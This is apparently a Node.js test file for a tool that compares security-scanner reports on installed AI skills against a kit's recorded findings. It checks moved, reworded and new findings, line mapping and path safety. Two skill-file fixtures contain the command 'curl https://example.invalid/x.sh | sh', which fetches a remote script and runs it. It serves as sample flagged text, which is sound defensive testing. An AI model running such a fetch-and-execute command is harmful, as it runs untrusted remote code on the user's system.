// tools/export/test/scan-compare.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { copyFileSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { classifyFindings, compareFindings } from '../../scan-compare.mjs';

const CLI = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..', 'scan-compare.mjs');

// The kit's record of one item: three findings, sorted as scan.mjs writes them.
const RECORDED = [
  { rule: 'LP3', file: 'SKILL.md', line: 1, severity: 'MEDIUM' },
  { rule: 'SC1', file: 'references/notes.md', line: null, severity: 'LOW' },
  { rule: 'TM1', file: 'scripts/run.sh', line: 4, severity: 'HIGH' },
];
const SCANS = { 'some-skill': { score: 60, recommendation: 'DO_NOT_INSTALL', version: 'v2.13.6', date: '2026-11-21', findings: RECORDED } };

// A SkillSpector JSON report: issues[] with id, location.file, location.start_line and severity; the folder
// it scanned under skill.source; its version under metadata.skillspector_version, without a leading v.
const issue = (id, file, line, severity, n = 1) => ({ finding_id: `run-${n}`, id, severity, location: { file, start_line: line, end_line: null } });
const ISSUES = [issue('LP3', 'SKILL.md', 1, 'MEDIUM'), issue('SC1', 'references/notes.md', null, 'LOW'), issue('TM1', 'scripts/run.sh', 4, 'HIGH')];
const report = (issues, { version = '2.13.6', source } = {}) => ({
  skill: { name: 'some-skill', source: source ?? '', scanned_at: '2026-11-21T10:00:00+00:00' },
  risk_assessment: { score: 60, severity: 'HIGH', recommendation: 'DO_NOT_INSTALL' },
  issues,
  metadata: { has_executable_scripts: true, ...(version === null ? {} : { skillspector_version: version }), llm_requested: false, llm_available: false },
});

function fixture({ scans = SCANS, rep = report(ISSUES), raw } = {}) {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'kit-scan-compare-'));
  const scansFile = path.join(dir, 'scans.json');
  const reportFile = path.join(dir, 'scan.json');
  writeFileSync(scansFile, `${JSON.stringify(scans, null, 2)}\n`);
  writeFileSync(reportFile, raw ?? JSON.stringify(rep, null, 2));
  return { dir, scansFile, reportFile, done: () => rmSync(dir, { recursive: true, force: true }) };
}
const run = (args) => {
  const r = spawnSync(process.execPath, [CLI, ...args], { encoding: 'utf8' });
  return { code: r.status, out: r.stdout, err: r.stderr };
};
// The line after the counts: the report's own verdict and score, from risk_assessment.
const REPORT = 'report: DO_NOT_INSTALL 60/100';
// Without --kit, moved lines are paired by order and say so after line 2.
const UNPROVEN = 'moved lines are paired by line order, not proven; give --kit <kit-item-path> with --root to map them';
const lines = (s) => s.split(/\r?\n/).filter(Boolean);

test('the same findings as the record: known 3, new 0, exit 0', () => {
  const f = fixture();
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('one finding the record lacks: new 1 and its line, exit 1', () => {
  const f = fixture({ rep: report([...ISSUES, issue('PE3', 'scripts/run.sh', 9, 'CRITICAL')]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 1', REPORT, 'new: CRITICAL PE3 scripts/run.sh:9']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('a new finding with no line is listed by its file alone', () => {
  const f = fixture({ rep: report([...ISSUES, issue('SC2', 'references/more.md', undefined, 'LOW')]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 1', REPORT, 'new: LOW SC2 references/more.md']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

// A finding whose rule and file the record holds at another line has moved (an adapted SKILL.md shifts
// lines): `moved: <severity> <rule> <file>:<recorded>` + arrow + `<found>`, and exit 1.
const ARROW = String.fromCharCode(0x2192);

test('a recorded finding at another line: moved 1 and its line, exit 1', () => {
  const f = fixture({ rep: report([issue('LP3', 'SKILL.md', 5, 'MEDIUM'), ISSUES[1], ISSUES[2]]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 2, moved: 1, reworded: 0, new: 0', REPORT, UNPROVEN, `moved: MEDIUM LP3 SKILL.md:1${ARROW}5`]);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('moved lines come before new ones; a rule the record lacks for that file, or a second copy, is new', () => {
  const f = fixture({ rep: report([issue('XX9', 'SKILL.md', 4, 'HIGH'), issue('LP3', 'SKILL.md', 9, 'MEDIUM'), issue('LP3', 'SKILL.md', 4, 'MEDIUM'), ISSUES[1], ISSUES[2]]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    // The one record of LP3 in SKILL.md pairs with the lowest found line, 4; line 9 is a second copy.
    assert.deepEqual(lines(r.out), ['known: 2, moved: 1, reworded: 0, new: 2', REPORT, UNPROVEN, `moved: MEDIUM LP3 SKILL.md:1${ARROW}4`,
      'new: HIGH XX9 SKILL.md:4', 'new: MEDIUM LP3 SKILL.md:9']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('classifyFindings: exact matches first, then pairs by rule and file in line order, the rest new', () => {
  const at = (rule, file, line, severity = 'LOW') => ({ rule, file, line, severity });
  const recorded = [at('TM1', 'a.sh', 4), at('TM1', 'a.sh', 10), at('TM1', 'a.sh', 20), at('SC1', 'n.md', null)];
  const found = [at('TM1', 'a.sh', 12), at('TM1', 'a.sh', 20), at('TM1', 'a.sh', 6), at('SC1', 'n.md', 7), at('SC1', 'm.md', 7)];
  const r = classifyFindings(recorded, found);
  assert.deepEqual(r.known, [at('TM1', 'a.sh', 20)]);
  // Records 4 and 10 pair with found 6 and 12 in line order; the list keeps the order of `found`.
  assert.deepEqual(r.moved, [{ ...at('TM1', 'a.sh', 12), from: 10 }, { ...at('TM1', 'a.sh', 6), from: 4 }, { ...at('SC1', 'n.md', 7), from: null }]);
  assert.deepEqual(r.new, [at('SC1', 'm.md', 7)]);
  assert.deepEqual(classifyFindings([], []), { known: [], moved: [], reworded: [], new: [] });
});

test('a moved finding with no line on one side prints - for it', () => {
  const f = fixture({ rep: report([ISSUES[0], issue('SC1', 'references/notes.md', 7, 'LOW'), ISSUES[2]]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 2, moved: 1, reworded: 0, new: 0', REPORT, UNPROVEN, `moved: LOW SC1 references/notes.md:-${ARROW}7`]);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('the same findings reordered, with \\ between path parts: still new 0', () => {
  const f = fixture({ rep: report([issue('TM1', 'scripts\\run.sh', 4, 'HIGH', 7), issue('SC1', 'references\\notes.md', null, 'LOW', 8), issue('LP3', 'SKILL.md', 1, 'MEDIUM', 9)]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('absolute file paths are made relative to the folder the report says it scanned (skill.source)', () => {
  const item = path.resolve(os.tmpdir(), 'installed', 'some-skill');
  const abs = (rel) => path.join(item, ...rel.split('/'));
  const f = fixture({ rep: report([issue('LP3', abs('SKILL.md'), 1, 'MEDIUM'), issue('SC1', abs('references/notes.md'), null, 'LOW'), issue('TM1', abs('scripts/run.sh'), 4, 'HIGH')], { source: item }) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('--root names the item folder, and wins over skill.source', () => {
  const item = path.resolve(os.tmpdir(), 'installed', 'some-skill');
  const abs = (rel) => path.join(item, ...rel.split('/'));
  const f = fixture({ rep: report([issue('LP3', abs('SKILL.md'), 1, 'MEDIUM'), issue('SC1', abs('references/notes.md'), null, 'LOW'), issue('TM1', abs('scripts/run.sh'), 4, 'HIGH')], { source: path.resolve(os.tmpdir(), 'elsewhere') }) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--root', item]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('absolute file paths with no folder to make them relative to: exit 2, asks for --root', () => {
  const item = path.resolve(os.tmpdir(), 'installed', 'some-skill');
  const f = fixture({ rep: report([issue('LP3', path.join(item, 'SKILL.md'), 1, 'MEDIUM')]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.equal(r.code, 2);
    assert.equal(r.out, '');
    assert.match(r.err, /--root <item-folder>/);
  } finally { f.done(); }
});

test('a report from another scanner version: the version line first, compared anyway, exit 1', () => {
  const f = fixture({ rep: report(ISSUES, { version: '2.2.3' }) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ["scanner version v2.2.3 differs from the kit's record v2.13.6; counts may differ", 'known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('the same version written with or without a leading v matches', () => {
  const f = fixture({ rep: report(ISSUES, { version: 'v2.13.6' }) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('a report that states no scanner version counts as a different version: exit 1', () => {
  const f = fixture({ rep: report(ISSUES, { version: null }) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ["scanner version not stated in the report; the kit's record is v2.13.6; counts may differ", 'known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('the report line: SAFE 0/100 as the report states it, and "verdict not stated" when it states none', () => {
  const safe = fixture({ rep: { ...report(ISSUES), risk_assessment: { score: 0, severity: 'LOW', recommendation: 'SAFE' } } });
  const none = fixture({ rep: (({ risk_assessment, ...rest }) => rest)(report(ISSUES)) });
  const half = fixture({ rep: { ...report(ISSUES), risk_assessment: { recommendation: 'SAFE' } } });
  try {
    const a = run(['some-skill', safe.reportFile, '--scans', safe.scansFile]);
    assert.deepEqual(lines(a.out), ['known: 3, moved: 0, reworded: 0, new: 0', 'report: SAFE 0/100']);
    assert.equal(a.code, 0, a.err);
    for (const f of [none, half]) {
      const b = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
      assert.deepEqual(lines(b.out), ['known: 3, moved: 0, reworded: 0, new: 0', 'report: verdict not stated']);
      assert.equal(b.code, 0, b.err);
    }
  } finally { safe.done(); none.done(); half.done(); }
});

test('an item the kit has no record of: exit 2, nothing on stdout', () => {
  const f = fixture();
  try {
    const r = run(['no-such-item', f.reportFile, '--scans', f.scansFile]);
    assert.equal(r.code, 2);
    assert.equal(r.out, '');
    assert.match(r.err, /no-such-item/);
  } finally { f.done(); }
});

test('without --scans it reads tools/export/scans.json beside itself', () => {
  const f = fixture();
  try {
    const r = run(['no-such-item-at-all', f.reportFile]);
    assert.equal(r.code, 2);
    assert.match(r.err, /export[\\/]scans\.json/);
  } finally { f.done(); }
});

test('bad input exits 2: unreadable report JSON, a missing report, no issues list, a record without findings, bad arguments', () => {
  const bad = fixture({ raw: '{ not json' });
  const noList = fixture({ rep: { skill: {}, metadata: { skillspector_version: '2.13.6' } } });
  const countOnly = fixture({ scans: { 'some-skill': { score: 0, recommendation: 'SAFE', findings: 0, version: 'v2.2.3', date: '2026-11-19' } } });
  try {
    assert.equal(run(['some-skill', bad.reportFile, '--scans', bad.scansFile]).code, 2);
    assert.equal(run(['some-skill', path.join(bad.dir, 'missing.json'), '--scans', bad.scansFile]).code, 2);
    assert.equal(run(['some-skill', noList.reportFile, '--scans', noList.scansFile]).code, 2);
    assert.equal(run(['some-skill', countOnly.reportFile, '--scans', countOnly.scansFile]).code, 2);
    assert.equal(run(['some-skill', bad.reportFile, '--scans', path.join(bad.dir, 'missing.json')]).code, 2);
    for (const args of [[], ['some-skill'], ['some-skill', bad.reportFile, '--scans'], ['some-skill', bad.reportFile, '--nope'], ['a', 'b', 'c']]) {
      const r = run(args);
      assert.equal(r.code, 2, `args ${args.length}`);
      assert.match(r.err, /usage: node tools\/scan-compare\.mjs <item-key> <report\.json>/);
    }
  } finally { bad.done(); noList.done(); countOnly.done(); }
});

test('a report written with a byte-order mark still reads', () => {
  const f = fixture({ raw: `\uFEFF${JSON.stringify(report(ISSUES))}` });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile]);
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

// `-` as the report reads it from stdin, so the scanner's stdout pipes straight in: no temp file, and no
// shell redirection that might re-encode it (Windows PowerShell 5.1 writes UTF-16 with >).
const runWith = (args, input) => {
  const r = spawnSync(process.execPath, [CLI, ...args], { encoding: 'utf8', input });
  return { code: r.status, out: r.stdout, err: r.stderr };
};

test('- reads the report from stdin', () => {
  const f = fixture();
  try {
    const same = runWith(['some-skill', '-', '--scans', f.scansFile], JSON.stringify(report(ISSUES)));
    assert.deepEqual(lines(same.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(same.code, 0, same.err);
    const more = runWith(['some-skill', '-', '--scans', f.scansFile], `\uFEFF${JSON.stringify(report([...ISSUES, issue('PE3', 'scripts/run.sh', 9, 'CRITICAL')]))}`);
    assert.deepEqual(lines(more.out), ['known: 3, moved: 0, reworded: 0, new: 1', REPORT, 'new: CRITICAL PE3 scripts/run.sh:9']);
    assert.equal(more.code, 1);
  } finally { f.done(); }
});

test('- with --root: absolute paths in the piped report are made relative to it', () => {
  const item = path.resolve(os.tmpdir(), 'installed', 'some-skill');
  const abs = (rel) => path.join(item, ...rel.split('/'));
  const f = fixture();
  try {
    const rep = report([issue('LP3', abs('SKILL.md'), 1, 'MEDIUM'), issue('SC1', abs('references/notes.md'), null, 'LOW'), issue('TM1', abs('scripts/run.sh'), 4, 'HIGH')]);
    const r = runWith(['some-skill', '-', '--scans', f.scansFile, '--root', item], JSON.stringify(rep));
    assert.deepEqual(lines(r.out), ['known: 3, moved: 0, reworded: 0, new: 0', REPORT]);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('- with nothing on stdin (the scanner printed no report): exit 2, nothing on stdout', () => {
  const f = fixture();
  try {
    for (const input of ['', '  \r\n']) {
      const r = runWith(['some-skill', '-', '--scans', f.scansFile], input);
      assert.equal(r.code, 2, JSON.stringify(input));
      assert.equal(r.out, '');
      assert.match(r.err, /stdin/);
    }
    const bad = runWith(['some-skill', '-', '--scans', f.scansFile], 'Error: Safe file output is unsupported');
    assert.equal(bad.code, 2);
    assert.match(bad.err, /stdin/);
  } finally { f.done(); }
});

// Leaving the pipe unread breaks it under the scanner, which on Windows then prints "[Errno 22] Invalid
// argument" beside the comparer's own message; so stdin is read to the end before the record is checked.
test('- reads stdin to the end even when the record check fails', () => {
  const f = fixture();
  try {
    const big = JSON.stringify(report(Array.from({ length: 20000 }, (_, n) => issue('TM1', `scripts/s${n}.sh`, n, 'HIGH', n))));
    const r = spawnSync(process.execPath, [CLI, 'no-such-item', '-', '--scans', f.scansFile], { encoding: 'utf8', input: big });
    assert.equal(r.error, undefined, String(r.error));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /no-such-item/);
    const empty = runWith(['no-such-item', '-', '--scans', f.scansFile], '');
    assert.equal(empty.code, 2);
    assert.match(empty.err, /nothing came in on stdin/);
  } finally { f.done(); }
});

// macOS keeps its temporary folder under /var, a link to /private/var: run through a linked path, the
// script must still run, never exit 0 having compared nothing.
test('scan-compare.mjs runs when started through a linked folder', () => {
  const kit = mkdtempSync(path.join(os.tmpdir(), 'kit-compare-'));
  const link = path.join(mkdtempSync(path.join(os.tmpdir(), 'kit-link-')), 'kit');
  try {
    mkdirSync(path.join(kit, 'tools', 'export'), { recursive: true });
    copyFileSync(CLI, path.join(kit, 'tools', 'scan-compare.mjs'));
    copyFileSync(path.join(path.dirname(CLI), 'export', 'scan.mjs'), path.join(kit, 'tools', 'export', 'scan.mjs'));
    copyFileSync(path.join(path.dirname(CLI), 'compare-install.mjs'), path.join(kit, 'tools', 'compare-install.mjs'));
    copyFileSync(path.join(path.dirname(CLI), 'export', 'item-hash.mjs'), path.join(kit, 'tools', 'export', 'item-hash.mjs'));
    symlinkSync(kit, link, 'junction');
    const r = spawnSync(process.execPath, [path.join(link, 'tools', 'scan-compare.mjs')], { encoding: 'utf8' });
    assert.equal(r.status, 2, r.stdout + r.stderr);
    assert.match(r.stderr, /usage: node tools\/scan-compare\.mjs/);
  } finally { rmSync(path.dirname(link), { recursive: true, force: true }); rmSync(kit, { recursive: true, force: true }); }
});

test('compareFindings matches by rule, file and line as a multiset; severity is not part of the match', () => {
  const a = { rule: 'RA2', file: 's.sh', line: 2, severity: 'HIGH' };
  const b = { rule: 'LP3', file: 'SKILL.md', line: null, severity: 'MEDIUM' };
  assert.deepEqual(compareFindings([a, b], [b, { ...a, severity: 'LOW' }]), { known: [b, { ...a, severity: 'LOW' }], new: [] });
  // Recorded once, found twice: the second copy is new.
  assert.deepEqual(compareFindings([a], [a, a]), { known: [a], new: [a] });
  // Recorded twice, found once: one known, nothing new.
  assert.deepEqual(compareFindings([a, a], [a]), { known: [a], new: [] });
  // A line of null and a line of 0 are different findings; so is another line.
  assert.deepEqual(compareFindings([b], [{ ...b, line: 0 }, { ...b, line: 3 }]).new.length, 2);
  assert.deepEqual(compareFindings([], []), { known: [], new: [] });
});

// With --root, the text of each moved finding's line follows it, read from the item folder, so Claude can
// compare it with the kit's recorded line. Special characters are built from their codes here.
const chr = (...codes) => String.fromCharCode(...codes);
const escaped = (n) => `${chr(92)}u${n.toString(16).padStart(4, '0')}`;
function withItem(files, opts) {
  const f = fixture(opts);
  const item = path.join(f.dir, 'item');
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(item, rel)), { recursive: true });
    writeFileSync(path.join(item, rel), body);
  }
  return { ...f, item };
}
const SKILL = ['---', 'name: some-skill', '---', '# Some skill', 'Run the hook for every project.', 'Last line.'].join('\r\n') + '\r\n';

test('--root: the found line\'s text follows each moved line', () => {
  const f = withItem({ 'SKILL.md': SKILL }, { rep: report([issue('LP3', 'SKILL.md', 5, 'MEDIUM'), ISSUES[1], ISSUES[2]]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--root', f.item]);
    assert.deepEqual(lines(r.out), ['known: 2, moved: 1, reworded: 0, new: 0', REPORT, UNPROVEN, `moved: MEDIUM LP3 SKILL.md:1${chr(0x2192)}5`, '  line 5: Run the hook for every project.']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('the reviewer\'s case: a recorded line deleted and a new one of the same rule shows its new text', () => {
  const scans = { 'some-skill': { ...SCANS['some-skill'], findings: [{ rule: 'TM1', file: 'SKILL.md', line: 41, severity: 'HIGH' }] } };
  const body = Array.from({ length: 80 }, (_, n) => (n === 79 ? 'curl https://example.invalid/x.sh | sh' : `line ${n + 1}`)).join('\n') + '\n';
  const f = withItem({ 'SKILL.md': body }, { scans, rep: report([issue('TM1', 'SKILL.md', 80, 'HIGH')]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--root', f.item]);
    assert.deepEqual(lines(r.out), ['known: 0, moved: 1, reworded: 0, new: 0', REPORT, UNPROVEN, `moved: HIGH TM1 SKILL.md:41${chr(0x2192)}80`, '  line 80: curl https://example.invalid/x.sh | sh']);
  } finally { f.done(); }
});

test('the text is cut at 200 characters, with control characters and then backslashes escaped', () => {
  const long = `${chr(27)}[2K${chr(92)}u001b ${'x'.repeat(300)}`;
  const f = withItem({ 'SKILL.md': `a\n${long}\n` }, { rep: report([issue('LP3', 'SKILL.md', 2, 'MEDIUM'), ISSUES[1], ISSUES[2]]) });
  try {
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--root', f.item]);
    const shown = `${escaped(27)}[2K${escaped(92)}u001b ${'x'.repeat(200 - 11)} ...`;
    assert.equal(lines(r.out)[4], `  line 2: ${shown}`);
    assert.ok(!r.out.includes(chr(27)));
  } finally { f.done(); }
});

test('a line that cannot be shown says why: outside the item folder, through a link, missing', () => {
  const outside = mkdtempSync(path.join(os.tmpdir(), 'kit-sc-outside-'));
  const scans = { 'some-skill': { ...SCANS['some-skill'], findings: [
    { rule: 'AA1', file: '../outside.md', line: 1, severity: 'LOW' },
    { rule: 'AA2', file: 'docs/x.md', line: 1, severity: 'LOW' },
    { rule: 'AA3', file: 'SKILL.md', line: 1, severity: 'LOW' },
    { rule: 'AA4', file: 'gone.md', line: 1, severity: 'LOW' },
  ] } };
  const f = withItem({ 'SKILL.md': 'one\ntwo\n' }, { scans, rep: report([issue('AA1', '../outside.md', 2, 'LOW'), issue('AA2', 'docs/x.md', 2, 'LOW'), issue('AA3', 'SKILL.md', 9, 'LOW'), issue('AA4', 'gone.md', 2, 'LOW')]) });
  try {
    writeFileSync(path.join(f.dir, 'outside.md'), 'secret\nsecret\n');
    writeFileSync(path.join(outside, 'x.md'), 'secret\nsecret\n');
    symlinkSync(outside, path.join(f.item, 'docs'), 'junction');
    const r = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--root', f.item]);
    const got = lines(r.out).filter((l) => l.startsWith('  '));
    // In the order found, which is sorted by file name: ../outside.md, SKILL.md, docs/x.md, gone.md.
    assert.deepEqual(got, ['  (not read: outside the item folder)', '  (no line 9 in SKILL.md)', '  (not read: outside the item folder)', '  (not read: ENOENT)']);
    assert.doesNotMatch(r.out, /secret/);
  } finally { f.done(); rmSync(outside, { recursive: true, force: true }); }
});

// With --kit, each recorded line is mapped through the line diff of the kit's copy and the installed one.
const rec = (rule, file, line, severity = 'HIGH') => ({ rule, file, line, severity });
const numbered = (n, set = {}) => `${Array.from({ length: n }, (_, k) => set[k + 1] ?? `line ${k + 1}`).join('\n')}\n`;
function kitPair(kitFiles, instFiles, findings, issues) {
  const f = fixture({ scans: { 'some-skill': { ...SCANS['some-skill'], findings } }, rep: report(issues) });
  const write = (root, files) => {
    for (const [rel, body] of Object.entries(files)) {
      mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
      writeFileSync(path.join(root, rel), body);
    }
  };
  const kitDir = path.join(f.dir, 'kit');
  const inst = path.join(f.dir, 'installed');
  mkdirSync(kitDir);
  mkdirSync(inst);
  write(kitDir, kitFiles);
  write(inst, instFiles);
  return { ...f, go: () => run(['some-skill', f.reportFile, '--scans', f.scansFile, '--kit', kitDir, '--root', inst]) };
}
const A = chr(0x2192);
const FLAGGED = { 3: 'TM1 three', 5: 'AE1 five', 6: 'AE1 six', 7: 'TM1 seven' };

test('--kit: a deleted recorded line moves the findings after it, proven, exit 0 (the real-data false stop)', () => {
  const kit = numbered(10, FLAGGED);
  const installed = kit.replace('TM1 three\n', '');
  const f = kitPair({ 'SKILL.md': kit }, { 'SKILL.md': installed },
    [rec('TM1', 'SKILL.md', 3), rec('AE1', 'SKILL.md', 5), rec('AE1', 'SKILL.md', 6), rec('TM1', 'SKILL.md', 7)],
    [issue('AE1', 'SKILL.md', 4, 'HIGH'), issue('AE1', 'SKILL.md', 5, 'HIGH'), issue('TM1', 'SKILL.md', 6, 'HIGH')]);
  try {
    const r = f.go();
    // Without the mapping, AE1 at 5 would read known though it now holds kit line 6's text.
    assert.deepEqual(lines(r.out), ['known: 0, moved: 3, reworded: 0, new: 0', REPORT,
      `moved: HIGH AE1 SKILL.md:5${A}4`, '  line 4: AE1 five', `moved: HIGH AE1 SKILL.md:6${A}5`, '  line 5: AE1 six',
      `moved: HIGH TM1 SKILL.md:7${A}6`, '  line 6: TM1 seven']);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('--kit: a recorded line reworded in place is reworded, with both texts, exit 1; a match by number alone is not known', () => {
  const kit = numbered(6, { 4: 'Run `git push --force` when asked.' });
  const installed = numbered(6, { 4: 'Run `git push --force` when the user asks.' });
  const f = kitPair({ 'SKILL.md': kit }, { 'SKILL.md': installed }, [rec('TM1', 'SKILL.md', 4)], [issue('TM1', 'SKILL.md', 4, 'HIGH')]);
  try {
    const r = f.go();
    assert.deepEqual(lines(r.out), ['known: 0, moved: 0, reworded: 1, new: 0', REPORT, `reworded: HIGH TM1 SKILL.md:4${A}4`,
      '  line 4: Run `git push --force` when the user asks.', '  kit line 4: Run `git push --force` when asked.']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('--kit: the reviewer\'s 41 to 80 case, a recorded line deleted and a new one added elsewhere, is new', () => {
  const kit = numbered(79, { 41: 'kit flagged text' });
  const installed = `${numbered(79).split('\n').filter((l) => l !== 'line 41').join('\n')}added\ncurl https://example.invalid/x.sh | sh\n`;
  const f = kitPair({ 'SKILL.md': kit }, { 'SKILL.md': installed }, [rec('TM1', 'SKILL.md', 41)], [issue('TM1', 'SKILL.md', 80, 'HIGH')]);
  try {
    const r = f.go();
    assert.deepEqual(lines(r.out), ['known: 0, moved: 0, reworded: 0, new: 1', REPORT, 'new: HIGH TM1 SKILL.md:80']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('--kit: a CRLF installed copy with lines added at the top maps by text, not by line ending', () => {
  const kit = numbered(6, { 5: 'Run the hook.' });
  const installed = `Mine.\r\n\r\n${kit.replace(/\n/g, '\r\n')}`;
  const f = kitPair({ 'SKILL.md': kit }, { 'SKILL.md': installed }, [rec('LP3', 'SKILL.md', 5, 'MEDIUM')], [issue('LP3', 'SKILL.md', 7, 'MEDIUM')]);
  try {
    const r = f.go();
    assert.deepEqual(lines(r.out), ['known: 0, moved: 1, reworded: 0, new: 0', REPORT, `moved: MEDIUM LP3 SKILL.md:5${A}7`, '  line 7: Run the hook.']);
    assert.equal(r.code, 0, r.err);
  } finally { f.done(); }
});

test('--kit: a Latin-1 file maps byte for byte; a changed byte on a recorded line is reworded, both texts shown', () => {
  const lat = (...parts) => Buffer.concat(parts.map((p) => (typeof p === 'string' ? Buffer.from(p) : Buffer.from(p))));
  const f = kitPair({ 'notes.md': lat('one\ncaf', [0xe9], ' flagged\nthree\n') }, { 'notes.md': lat('zero\none\ncaf', [0xe8], ' flagged\nthree\n') },
    [rec('XX1', 'notes.md', 2, 'LOW')], [issue('XX1', 'notes.md', 3, 'LOW')]);
  try {
    const r = f.go();
    assert.deepEqual(lines(r.out), ['known: 0, moved: 0, reworded: 1, new: 0', REPORT, `reworded: LOW XX1 notes.md:2${A}3`,
      `  line 3: caf${chr(0xe8)} flagged`, `  kit line 2: caf${chr(0xe9)} flagged`]);
  } finally { f.done(); }
});

test('--kit: a file that cannot be mapped is named, and its findings pair by nearest line or are new', () => {
  const f = kitPair({ 'SKILL.md': numbered(3), 'notes.md': numbered(3) }, { 'SKILL.md': numbered(3), 'extra.md': numbered(3) },
    [rec('SC1', 'notes.md', 2, 'LOW')], [issue('SC1', 'extra.md', 2, 'LOW')]);
  try {
    const r = f.go();
    // Only a file holding a recorded finding needs a mapping; extra.md holds none, so it gets no line.
    assert.deepEqual(lines(r.out), ['known: 0, moved: 0, reworded: 0, new: 1', REPORT,
      'no line map for notes.md: installed copy: ENOENT', 'new: LOW SC1 extra.md:2']);
  } finally { f.done(); }
});

test('--kit: a file with line breaks other than LF and CRLF has no line map, and no text is shown from it', () => {
  // A lone CR: the scanner may count it as a line break, the diff does not, so neither numbering is trusted.
  const f = kitPair({ 'x.md': `a${chr(13)}flag\n` }, { 'x.md': `z\na${chr(13)}flag\n` }, [rec('XX1', 'x.md', 2, 'LOW')], [issue('XX1', 'x.md', 3, 'LOW')]);
  try {
    const r = f.go();
    assert.deepEqual(lines(r.out), ['known: 0, moved: 0, reworded: 1, new: 0', REPORT, 'no line map for x.md: line breaks other than LF and CRLF',
      `reworded: LOW XX1 x.md:2${A}3`, '  (not read: line breaks other than LF and CRLF)', '  (not read: line breaks other than LF and CRLF)']);
    assert.equal(r.code, 1);
  } finally { f.done(); }
});

test('--kit needs --root, and a folder: else exit 2', () => {
  const f = fixture();
  try {
    const a = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--kit', f.dir]);
    assert.equal(a.code, 2);
    assert.match(a.err, /--kit needs --root/);
    const b = run(['some-skill', f.reportFile, '--scans', f.scansFile, '--kit', f.scansFile, '--root', f.dir]);
    assert.equal(b.code, 2);
    assert.match(b.err, /is not a folder/);
  } finally { f.done(); }
});
